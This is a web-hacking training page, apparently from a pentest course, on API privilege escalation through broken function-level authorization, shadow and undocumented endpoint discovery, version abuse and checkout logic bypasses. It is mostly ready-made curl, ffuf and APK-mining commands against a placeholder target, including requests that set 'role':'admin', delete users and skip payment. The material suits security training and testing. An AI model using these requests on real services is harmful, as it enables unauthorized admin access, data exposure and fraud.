---
layout: training-page
title: "API Privilege Escalation — BFLA, Shadow APIs & Versioning Abuse"
module: "Web Hacking"
tags:
  - api
  - bfla
  - shadow-api
  - api-versioning
  - authorization
  - owasp-api
  - business-logic
page_key: "web-api-privilege-escalation"
render_with_liquid: false
---

# API Privilege Escalation — BFLA, Shadow APIs & Versioning Abuse

This page covers three API attack categories not addressed by the existing API testing pages: Broken Function Level Authorization (BFLA, API5:2023), shadow/undocumented API discovery, and API versioning abuse. Together these represent vertical privilege escalation at the API layer — accessing admin functions rather than other users' objects.

---

## Broken Function Level Authorization (BFLA — API5:2023)

BFLA is vertical privilege escalation: a regular user accessing admin-level *functions*. Distinct from BOLA/IDOR (API1), which is horizontal access to other *objects*. In BFLA, there is no per-object ID to guess — the endpoint itself is restricted but the server fails to enforce that restriction.

### Discovery

```
# Step 1: Map the API surface as a regular user
# Check Swagger/OpenAPI docs for admin paths:
curl -s https://target.com/swagger.json | jq '.paths | keys[]' | grep -i "admin\|internal\|manage\|superuser\|staff"

# Step 2: Content discovery for admin endpoints
ffuf -u https://api.target.com/FUZZ -w /opt/SecLists/Discovery/Web-Content/api/api-endpoints.txt \
  -H "Authorization: Bearer USER_TOKEN" \
  -mc 200,201,204,400,403,405 \
  -o admin-endpoints.json

# Focus wordlist entries:
# /admin, /admin/users, /admin/settings, /management, /internal, /superadmin
# /v1/admin/*, /api/staff/*, /api/ops/*

# Step 3: HTTP method testing (BFLA via method confusion)
# If GET /api/users/{id} is allowed, try:
curl -X DELETE https://api.target.com/api/users/1 -H "Authorization: Bearer USER_TOKEN"
curl -X PUT https://api.target.com/api/users/1 \
  -H "Authorization: Bearer USER_TOKEN" \
  -d '{"role":"admin"}'
```

### Testing Pattern

```
# Regular user token — test admin endpoint:
curl -s https://api.target.com/api/admin/users \
  -H "Authorization: Bearer REGULAR_USER_TOKEN"
# 200 = BFLA confirmed

# Privilege check bypass via role parameter injection:
POST /api/user/update
{"name": "test", "role": "admin"}   # mass assignment into role field

# Check if admin actions are separated only by URL, not server-side role check:
GET /api/v1/users          # regular users
GET /api/v1/admin/users    # should 403 for regular users — test it
GET /api/v1/users?admin=true  # parameter-based admin flag
```

---

## Shadow API & Undocumented Endpoint Discovery

APIs accumulate endpoints over time. Old versions, debug routes, and internal endpoints frequently survive into production without documentation or access controls.

### JavaScript Source Mining

```
# Extract API paths from JavaScript bundles:
# Install linkfinder: pip3 install linkfinder
python3 linkfinder.py -i https://target.com -d -o cli | grep "/api"

# GAU (GetAllURLs) — historical endpoints from Wayback Machine + AlienVault:
gau target.com | grep "api\|/v[0-9]" | sort -u

# Manual JS review — look for fetch/axios/XMLHttpRequest calls:
curl -s https://target.com/app.js | grep -oP '"(/api/[^"]+)"' | sort -u

# Wayback Machine for old API docs:
curl "http://web.archive.org/cdx/search/cdx?url=target.com/api*&output=text&fl=original&collapse=urlkey" \
  | grep -v "swagger\|openapi" | sort -u
```

### API Spec Discovery

```
# Common OpenAPI/Swagger locations:
for path in /swagger.json /openapi.json /api-docs /swagger-ui.html \
            /v1/swagger.json /api/v1/openapi.yaml /api/docs \
            /api/swagger /documentation /api.json; do
  curl -s -o /dev/null -w "%{http_code} $path\n" https://target.com$path
done

# Scrape all links from Swagger UI:
curl -s https://target.com/api-docs | python3 -c "
import sys, re, json
data = sys.stdin.read()
paths = re.findall(r'\"(/[^\"]+)\"', data)
for p in sorted(set(paths)):
    print(p)
"
```

### Mobile App Endpoint Extraction

```
# APK decompilation for hardcoded API endpoints:
apktool d target.apk -o target-apk/
grep -rE "https?://[^\"']+/api" target-apk/smali/ | sort -u

# Alternatively with jadx (decompile to Java):
jadx -d target-src/ target.apk
grep -r "\.get\(\"" target-src/ | grep "/api/" | sort -u

# iOS: strings on the binary:
strings Target.app/Target | grep "/api/" | sort -u
```

---

## API Versioning Abuse

When a new API version adds security controls, older versions often remain active with weaker controls.

### Version Enumeration

```
# Brute force API version numbers:
ffuf -u https://api.target.com/FUZZ/users \
  -w <(printf "api\nv1\nv2\nv3\nv4\nv5\nv6\nv7\nv8\nv9\nv10\napi/v1\napi/v2\napi/v3\nrest\nrest/v1\n1.0\n2.0") \
  -mc 200,201,400,401,403

# Also test path prefix variations:
curl https://api.target.com/v1/users
curl https://api.target.com/v2/users
curl https://api.target.com/v3/users   # current version
```

### Comparing Version Security Controls

```
# Test same endpoint across versions with regular user token:
for ver in v1 v2 v3; do
  echo "--- $ver ---"
  curl -s https://api.target.com/$ver/admin/users \
    -H "Authorization: Bearer USER_TOKEN" \
    -w "\nHTTP %{http_code}\n"
done

# Test if rate limiting exists on old version:
# v3: 429 after 10 attempts
# v1: 200 indefinitely (rate limiting added in v2)

# Test if auth is required on old version:
curl -s https://api.target.com/v1/users   # no auth header
curl -s https://api.target.com/v3/users   # no auth header → should 401
```

### Common Version-Specific Weaknesses

```
# v1 often lacks:
# - Rate limiting (brute force login endpoints)
# - Field filtering (v1 returns password_hash, v3 doesn't)
# - Scope validation (v1 ignores OAuth scopes)
# - Input validation (v1 accepts negative quantities, v3 rejects)

# Compare response schemas between versions:
diff <(curl -s https://api.target.com/v1/users/me -H "Auth: TOKEN" | jq 'keys[]') \
     <(curl -s https://api.target.com/v3/users/me -H "Auth: TOKEN" | jq 'keys[]')
# Fields in v1 not in v3: ["password_hash", "ssn", "internal_id", "admin_flag"]
```

---

## Business Logic Attacks via API

```
# Workflow bypass — skip payment step:
# Normal flow: GET /cart → POST /checkout → POST /payment → POST /orders/confirm
# Attack: POST /orders/confirm directly with cart contents
curl -X POST https://api.target.com/orders/confirm \
  -H "Authorization: Bearer TOKEN" \
  -d '{"cart_id": "abc123", "payment_method": "skip"}'

# Negative quantity for store credit:
PUT /api/cart/items/123
{"quantity": -5}   # results in credit instead of charge

# Coupon code replay / stacking:
# Apply coupon, complete checkout, cancel, reapply same coupon
# Race condition: POST /apply-coupon twice simultaneously
```

---

## Tools

- **Arjun** — hidden parameter discovery: `python3 arjun.py -u https://target.com/api/users`
- **kiterunner** — context-aware API endpoint brute-force: `kr scan https://target.com -w routes-small.kite`
- **mitmproxy** — intercept mobile app API traffic: `mitmproxy --mode transparent`
- **Burp Suite** — manual testing, Intruder for BFLA fuzzing
- **ffuf** — endpoint discovery with API-specific wordlists

## Resources

- OWASP API Security Top 10 — `owasp.org/API-Security`
- PortSwigger API testing guide — `portswigger.net/web-security/api-testing`
- SecLists API wordlists — `/opt/SecLists/Discovery/Web-Content/api/`
- kiterunner — `github.com/assetnote/kiterunner`
- Arjun — `github.com/s0md3v/Arjun`
